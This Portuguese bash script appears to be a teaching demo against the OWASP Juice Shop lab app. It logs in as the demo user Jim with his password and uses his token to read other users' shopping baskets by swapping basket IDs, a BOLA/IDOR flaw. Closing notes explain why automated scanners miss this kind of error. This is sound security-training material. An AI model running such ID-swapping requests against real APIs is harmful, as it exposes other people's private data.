#!/usr/bin/env bash
# CASO 4 - BOLA/IDOR: ver o carrinho de OUTRO usuário trocando o ID
# (OWASP API Security Top 10 2023 - API1: Broken Object Level Authorization | STRIDE: Information Disclosure)
# Código vulnerável: routes/basket.ts (busca o carrinho só pelo id da URL, sem checar o dono)
source "$(dirname "$0")/_comum.sh"
preparar

titulo "1) Login legítimo do Jim"
RESP="$(login 'jim@juice-sh.op' 'ncc-1701')"
TOKEN="$(jq -r '.authentication.token' <<<"$RESP")"
MEU_BID="$(jq -r '.authentication.bid' <<<"$RESP")"
echo "Carrinho do Jim (bid) = ${MEU_BID}"

carrinho() {
  curl -sS "${JUICE_URL}/rest/basket/$1" -H "Authorization: Bearer ${TOKEN}" \
    | jq -c '{basketId: .data.id, dono_UserId: .data.UserId, itens: [.data.Products[]?.name]}'
}

titulo "2) GET /rest/basket/${MEU_BID}  (o MEU carrinho - esperado)"
carrinho "$MEU_BID"

for OUTRO in 1 3; do
  [[ "$OUTRO" == "$MEU_BID" ]] && continue
  titulo "3) GET /rest/basket/${OUTRO}  (carrinho de OUTRA pessoa, com o MEU token)"
  carrinho "$OUTRO"
done

cat <<'TXT'

➡ A API conferiu QUEM você é (autenticação), mas não SE o objeto é seu (autorização).
➡ Repare: SAST, SCA, IaC e o DAST baseline NÃO apontaram esta falha. Erro de
  lógica de negócio exige modelagem de ameaças + testes de autorização na esteira.
TXT
